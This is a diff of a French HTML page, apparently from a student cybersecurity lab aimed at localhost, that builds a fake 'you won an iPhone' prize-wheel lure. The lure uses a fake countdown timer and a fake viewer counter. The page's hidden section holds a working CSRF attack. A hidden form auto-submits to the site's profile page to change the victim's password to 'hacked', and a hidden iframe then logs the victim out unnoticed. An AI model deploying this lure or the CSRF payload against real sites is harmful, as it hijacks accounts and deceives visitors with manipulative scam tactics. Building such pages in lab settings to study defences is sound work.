@@ -3,18 +3,273 @@
 
 <head>
     <meta charset="UTF-8">
-    <title>Gagnez un iPhone 15 !</title>
+    <title>🎉 Félicitations ! Vous avez été sélectionné !</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        .container {
+            text-align: center;
+            padding: 20px;
+        }
+
+        .header {
+            color: #ffd700;
+            font-size: 2.5rem;
+            text-shadow: 0 0 20px #ffd700, 0 0 40px #ff6b00;
+            margin-bottom: 10px;
+            animation: pulse 1.5s infinite;
+        }
+
+        .subheader {
+            color: #fff;
+            font-size: 1.2rem;
+            margin-bottom: 30px;
+        }
+
+        .wheel-container {
+            position: relative;
+            width: 320px;
+            height: 320px;
+            margin: 0 auto 30px;
+        }
+
+        .wheel {
+            width: 300px;
+            height: 300px;
+            border-radius: 50%;
+            position: relative;
+            margin: 0 auto;
+            background: conic-gradient(#ff6b6b 0deg 45deg,
+                    #ffd93d 45deg 90deg,
+                    #6bcb77 90deg 135deg,
+                    #4d96ff 135deg 180deg,
+                    #ff6b6b 180deg 225deg,
+                    #ffd93d 225deg 270deg,
+                    #6bcb77 270deg 315deg,
+                    #4d96ff 315deg 360deg);
+            border: 8px solid #ffd700;
+            box-shadow: 0 0 30px rgba(255, 215, 0, 0.5), inset 0 0 50px rgba(0, 0, 0, 0.3);
+            animation: spin 4s cubic-bezier(0.17, 0.67, 0.12, 0.99) forwards;
+        }
+
+        .wheel::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 60px;
+            height: 60px;
+            background: radial-gradient(circle, #ffd700, #ff9500);
+            border-radius: 50%;
+            border: 4px solid #fff;
+            z-index: 10;
+        }
+
+        .wheel-labels {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            animation: spin 4s cubic-bezier(0.17, 0.67, 0.12, 0.99) forwards;
+        }
+
+        .wheel-label {
+            position: absolute;
+            font-weight: bold;
+            font-size: 0.7rem;
+            color: #fff;
+            text-shadow: 1px 1px 2px #000;
+            width: 80px;
+            text-align: center;
+        }
+
+        .pointer {
+            position: absolute;
+            top: -15px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 0;
+            height: 0;
+            border-left: 20px solid transparent;
+            border-right: 20px solid transparent;
+            border-top: 40px solid #ff0000;
+            filter: drop-shadow(0 0 10px #ff0000);
+            z-index: 20;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(1507deg);
+            }
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+
+            50% {
+                transform: scale(1.05);
+                opacity: 0.9;
+            }
+        }
+
+        @keyframes blink {
+
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.5;
+            }
+        }
+
+        .prize-box {
+            background: linear-gradient(145deg, #ffd700, #ff9500);
+            padding: 20px 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 40px rgba(255, 215, 0, 0.4);
+            opacity: 0;
+            animation: fadeIn 1s 4.5s forwards;
+        }
+
+        .prize-text {
+            font-size: 1.8rem;
+            color: #1a1a2e;
+            font-weight: bold;
+        }
+
+        .prize-item {
+            font-size: 2.5rem;
+            margin: 10px 0;
+        }
+
+        @keyframes fadeIn {
+            to {
+                opacity: 1;
+            }
+        }
+
+        .confetti {
+            position: fixed;
+            width: 10px;
+            height: 10px;
+            opacity: 0;
+            animation: confettiFall 3s 4s forwards;
+        }
+
+        @keyframes confettiFall {
+            0% {
+                transform: translateY(-100vh) rotate(0deg);
+                opacity: 1;
+            }
+
+            100% {
+                transform: translateY(100vh) rotate(720deg);
+                opacity: 0;
+            }
+        }
+
+        .loading-text {
+            color: #aaa;
+            font-size: 0.9rem;
+            margin-top: 20px;
+            animation: blink 1s infinite;
+        }
+
+        .urgency {
+            color: #ff4444;
+            font-size: 1rem;
+            margin-top: 15px;
+            animation: blink 0.5s infinite;
+        }
+
+        .fake-counter {
+            color: #ffd700;
+            font-size: 1.1rem;
+            margin-top: 10px;
+        }
+    </style>
 </head>
 
 <body>
-    <h1 style="text-align: center; color: red;">Félicitations ! Vous avez gagné !</h1>
-    <p style="text-align: center;">Chargement de votre lot en cours...</p>
+    <div class="container">
+        <div class="header">🎰 FÉLICITATIONS ! 🎰</div>
+        <div class="subheader">Vous êtes le 1 000 000ème visiteur ! Tournez la roue pour découvrir votre prix !</div>
+
+        <div class="wheel-container">
+            <div class="pointer"></div>
+            <div class="wheel"></div>
+            <div class="wheel-labels">
+                <span class="wheel-label" style="top: 15%; left: 65%;">iPhone 15</span>
+                <span class="wheel-label" style="top: 35%; left: 80%;">500€</span>
+                <span class="wheel-label" style="top: 60%; left: 75%;">PS5</span>
+                <span class="wheel-label" style="top: 78%; left: 55%;">MacBook</span>
+                <span class="wheel-label" style="top: 78%; left: 25%;">1000€</span>
+                <span class="wheel-label" style="top: 60%; left: 5%;">AirPods</span>
+                <span class="wheel-label" style="top: 35%; left: 0%;">iPad</span>
+                <span class="wheel-label" style="top: 15%; left: 18%;">Tesla</span>
+            </div>
+        </div>
+
+        <div class="prize-box">
+            <div class="prize-text">🎊 VOUS AVEZ GAGNÉ 🎊</div>
+            <div class="prize-item">📱 iPhone 15 Pro Max 📱</div>
+            <div class="prize-text">Valeur : 1 299€</div>
+        </div>
+
+        <div class="loading-text">⏳ Préparation de votre lot en cours...</div>
+        <div class="urgency">⚠️ ATTENTION : Cette offre expire dans 2:59 minutes !</div>
+        <div class="fake-counter">👥 847 personnes regardent cette page</div>
+    </div>
+
+    <!-- Confettis -->
+    <div class="confetti" style="left: 10%; background: #ff6b6b;"></div>
+    <div class="confetti" style="left: 20%; background: #ffd93d; animation-delay: 4.2s;"></div>
+    <div class="confetti" style="left: 30%; background: #6bcb77; animation-delay: 4.4s;"></div>
+    <div class="confetti" style="left: 40%; background: #4d96ff; animation-delay: 4.1s;"></div>
+    <div class="confetti" style="left: 50%; background: #ff6b6b; animation-delay: 4.3s;"></div>
+    <div class="confetti" style="left: 60%; background: #ffd93d; animation-delay: 4.5s;"></div>
+    <div class="confetti" style="left: 70%; background: #6bcb77; animation-delay: 4.2s;"></div>
+    <div class="confetti" style="left: 80%; background: #4d96ff; animation-delay: 4.4s;"></div>
+    <div class="confetti" style="left: 90%; background: #ff6b6b; animation-delay: 4.6s;"></div>
+
+    <!-- ========== PARTIE CACHÉE : ATTAQUE CSRF ========== -->
 
     <!-- ATTENTION : Si votre site est dans un sous-dossier (ex: http://localhost/SAE-Cyber/), 
          ajoutez ce dossier dans l'URL ci-dessous. Ici on vise localhost a la racine. -->
 
     <!-- Iframe caché pour soumettre le formulaire sans quitter la page -->
     <iframe name="hiddenFrame" style="display:none;"></iframe>
+
+    <!-- Second iframe caché pour le logout -->
+    <iframe id="logoutFrame" style="display:none;"></iframe>
 
     <form action="http://localhost/index.php?page=profil" method="POST" id="hackForm" target="hiddenFrame">
         <input type="hidden" name="new_password" value="hacked">
@@ -24,10 +279,34 @@
         // Le script valide le formulaire automatiquement sans que l'utilisateur ne clique
         document.getElementById('hackForm').submit();
 
-        // Après 2 secondes, on déconnecte l'utilisateur pour l'empêcher de remodifier son mot de passe
+        // Après 2 secondes, on déconnecte l'utilisateur via l'iframe caché
+        // La victime reste sur cette page sans rien remarquer !
         setTimeout(function () {
-            window.location.href = "http://localhost/index.php?page=logout";
+            document.getElementById('logoutFrame').src = "http://localhost/index.php?page=logout";
         }, 2000);
+
+        // Faux compteur de temps qui décrémente
+        let minutes = 2;
+        let seconds = 59;
+        setInterval(function () {
+            seconds--;
+            if (seconds < 0) {
+                seconds = 59;
+                minutes--;
+            }
+            if (minutes < 0) {
+                minutes = 2;
+                seconds = 59;
+            }
+            document.querySelector('.urgency').innerHTML =
+                '⚠️ ATTENTION : Cette offre expire dans ' + minutes + ':' + (seconds < 10 ? '0' : '') + seconds + ' minutes !';
+        }, 1000);
+
+        // Faux compteur de visiteurs qui change
+        setInterval(function () {
+            const viewers = 800 + Math.floor(Math.random() * 100);
+            document.querySelector('.fake-counter').innerHTML = '👥 ' + viewers + ' personnes regardent cette page';
+        }, 3000);
     </script>
 </body>
 
